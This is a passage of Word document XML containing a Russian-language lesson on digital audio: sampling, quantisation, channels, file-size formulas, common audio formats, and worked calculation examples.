      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Частотой** (измеряется в герцах, Гц) — определяет высоту тона</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Амплитудой** — определяет громкость звука</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Тембром** — определяется спектральным составом (наличием обертонов)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Человеческое ухо воспринимает звуковые колебания в диапазоне приблизительно от 20 Гц до 20 000 Гц (20 кГц). С возрастом верхняя граница обычно снижается до 15-16 кГц.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Аналоговый звуковой сигнал является </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>непрерывным</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — в каждый момент времени он имеет определённое значение амплитуды. Компьютер же может работать только с дискретными (прерывными) данными, поэтому необходимо преобразовать непрерывный сигнал в последовательность чисел.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Дискретизация и квантование</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Процесс преобразования аналогового звукового сигнала в цифровую форму включает два основных этапа:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. Дискретизация (sampling)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это процесс измерения амплитуды звукового сигнала через равные промежутки времени. Каждое измерение называется </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>отсчётом</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>сэмплом</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (sample).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Частота дискретизации</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (sample rate) — количество отсчётов, производимых за одну секунду. Измеряется в герцах (Гц) или килогерцах (кГц). Например, частота дискретизации 44100 Гц означает, что каждую секунду берётся 44100 отсчётов амплитуды сигнала.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Согласно </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>теореме Котельникова-Найквиста</w:t>
      </w:r>
      <w:r>
        <w:t>, для точного восстановления аналогового сигнала из цифрового частота дискретизации должна быть как минимум в два раза больше максимальной частоты в спектре исходного сигнала. Для качественного воспроизведения звука, воспринимаемого человеком (до 20 кГц), необходима частота дискретизации не менее 40 кГц.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. Квантование (quantization)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это процесс преобразования измеренного значения амплитуды в цифровое значение с ограниченной точностью.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Разрядность квантования</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (bit depth) — количество битов, используемых для представления одного отсчёта. Определяет точность измерения амплитуды и динамический диапазон звука.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**8 бит** (1 байт): 2⁸ = 256 уровней квантования</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**16 бит** (2 байта): 2¹⁶ = 65536 уровней квантования</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**24 бита** (3 байта): 2²⁴ = 16777216 уровней квантования</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**32 бита** (4 байта): 2³² = 4294967296 уровней квантования</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Чем выше разрядность, тем точнее представление амплитуды и тем больше динамический диапазон (разница между самым тихим и самым громким звуком).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Количество каналов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Монофонический</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (моно) звук использует один канал. Все звуки воспроизводятся одинаково из всех динамиков.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стереофонический</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (стерео) звук использует два независимых канала (левый и правый), что создаёт эффект пространственного звучания.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Также существуют многоканальные форматы: 5.1 (шесть каналов), 7.1 (восемь каналов) и другие, используемые в системах объёмного звучания (surround sound).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Расчёт объёма несжатого звукового файла</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Объём несжатого цифрового звука зависит от трёх основных параметров:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Частота дискретизации** (f) — Гц</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Разрядность квантования** (b) — бит</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Количество каналов** (c)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Длительность записи** (t) — секунды</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Формула для расчёта объёма в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>битах</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>V (бит) = f × b × c × t</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Для получения объёма в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>байтах</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> делим на 8:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>V (байт) = (f × b × c × t) / 8</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Для получения объёма в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>килобайтах</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (КБ) делим на 1024:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>V (КБ) = (f × b × c × t) / (8 × 1024)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Для получения объёма в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>мегабайтах</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (МБ):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>V (МБ) = (f × b × c × t) / (8 × 1024 × 1024)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Стандартные форматы цифрового звука</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>CD Audio (Audio CD)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Стандарт Audio CD, установленный в 1982 году, использует следующие параметры:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Частота дискретизации: **44100 Гц** (44.1 кГц)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Разрядность: **16 бит**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Количество каналов: **2** (стерео)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Этот стандарт стал эталоном качества для потребительского аудио и до сих пор широко используется.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Профессиональное аудио</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В профессиональной звукозаписи используются более высокие параметры:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Частота: **48 кГц**, **96 кГц** или **192 кГц**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Разрядность: **24 бита** или **32 бита** (с плавающей точкой)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Телефонная связь</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для телефонной связи и VoIP обычно используются:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Частота: **8 кГц**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Разрядность: **8 бит**</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Каналы: **1** (моно)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Это обеспечивает разборчивость речи при минимальном объёме данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Форматы хранения звуковых данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Несжатые форматы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>WAV (Waveform Audio File Format)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — стандартный формат для Windows, разработанный Microsoft и IBM. Хранит несжатые PCM-данные (Pulse Code Modulation). Поддерживает различные параметры дискретизации и квантования.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>AIFF (Audio Interchange File Format)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — аналог WAV для платформы Macintosh, разработанный Apple.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Несжатые форматы обеспечивают максимальное качество, но требуют большого объёма памяти.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Форматы со сжатием без потерь</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>FLAC (Free Lossless Audio Codec)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — формат сжатия аудио без потерь качества. Обеспечивает сжатие в 1.5-2 раза по сравнению с несжатым WAV при полном сохранении качества. Популярен среди аудиофилов.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ALAC (Apple Lossless Audio Codec)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — аналогичный формат от Apple.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>APE (Monkey's Audio)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — формат с высокой степенью сжатия без потерь, но медленной обработкой.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Форматы со сжатием с потерями</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MP3 (MPEG-1 Audio Layer 3)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — самый популярный формат сжатого аудио. Использует психоакустическую модель для удаления звуковых компонентов, которые человек плохо воспринимает. Обеспечивает сжатие в 10-12 раз при приемлемом качестве.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Параметр </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>битрейт</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (bitrate) определяет количество бит в секунду для кодирования звука:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>128 кбит/с — стандартное качество</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>192 кбит/с — хорошее качество</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>256-320 кбит/с — высокое качество</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>AAC (Advanced Audio Coding)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — более современный формат, чем MP3. При том же битрейте обеспечивает лучшее качество. Используется в iTunes, YouTube, мобильных устройствах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>OGG Vorbis</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — свободный формат с открытым исходным кодом, альтернатива MP3.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Opus</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — современный универсальный кодек с низкой задержкой, оптимизированный как для речи, так и для музыки. Используется в VoIP, потоковом вещании.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Примеры расчётов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 1: Расчёт объёма аудио CD-качества</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Рассчитать объём одной минуты стереозаписи в формате Audio CD.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дано</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Частота дискретизации: f = 44100 Гц</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Разрядность: b = 16 бит</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Количество каналов: c = 2 (стерео)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Длительность: t = 60 секунд</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>V (байт) = (f × b × c × t) / 8</w:t>
        <w:br/>
        <w:t>V = (44100 × 16 × 2 × 60) / 8</w:t>
        <w:br/>
        <w:t>V = (84 672 000) / 8</w:t>
        <w:br/>
        <w:t>V = 10 584 000 байт</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Переведём в мегабайты:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>V (МБ) = 10 584 000 / (1024 × 1024)</w:t>
        <w:br/>
        <w:t>V ≈ 10.09 МБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Одна минута стереозаписи в формате Audio CD занимает примерно </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>10 МБ</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проверка</w:t>
      </w:r>
      <w:r>
        <w:t>: Audio CD вмещает до 74 минут звука. 74 × 10 ≈ 740 МБ, что соответствует объёму CD-диска (650-700 МБ).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 2: Сравнение моно и стерео</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: На сколько стереофонический звук занимает больше места, чем монофонический при одинаковых остальных параметрах?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для моно: c₁ = 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Для стерео: c₂ = 2</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Отношение объёмов:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>V_стерео / V_моно = (f × b × 2 × t) / (f × b × 1 × t) = 2</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Стереофонический звук занимает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ровно в 2 раза</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> больше места, чем монофонический.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 3: Влияние разрядности на объём</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Рассчитать объём 5-секундной монозаписи с частотой 22050 Гц при разрядности 8 бит и 16 бит. Сравнить результаты.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дано</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>f = 22050 Гц</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>t = 5 секунд</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>c = 1 (моно)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>b₁ = 8 бит, b₂ = 16 бит</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для 8 бит:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>V₁ = (22050 × 8 × 1 × 5) / 8 = 110 250 байт ≈ 107.7 КБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Для 16 бит:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>V₂ = (22050 × 16 × 1 × 5) / 8 = 220 500 байт ≈ 215.3 КБ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Отношение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>V₂ / V₁ = 220 500 / 110 250 = 2</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t>: При увеличении разрядности с 8 до 16 бит объём удваивается. 8-битная запись занимает ~108 КБ, 16-битная — ~215 КБ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Пример 4: Расчёт длительности записи по объёму файла</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача</w:t>
      </w:r>
      <w:r>
        <w:t>: Файл WAV занимает 5 МБ. Параметры: частота 48 кГц, разрядность 16 бит, стерео. Определить длительность записи в секундах.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Дано</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>V = 5 МБ = 5 × 1024 × 1024 = 5 242 880 байт</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>f = 48 000 Гц</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>b = 16 бит</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>c = 2</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Из формулы V = (f × b × c × t) / 8 выразим t:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>t = (V × 8) / (f × b × c)</w:t>
        <w:br/>
        <w:t>t = (5 242 880 × 8) / (48 000 × 16 × 2)</w:t>
        <w:br/>
        <w:t>t = 41 943 040 / 1 536 000</w:t>
        <w:br/>
        <w:t>t ≈ 27.3 секунды</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ответ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Длительность записи составляет примерно </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>27.3 секунды</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
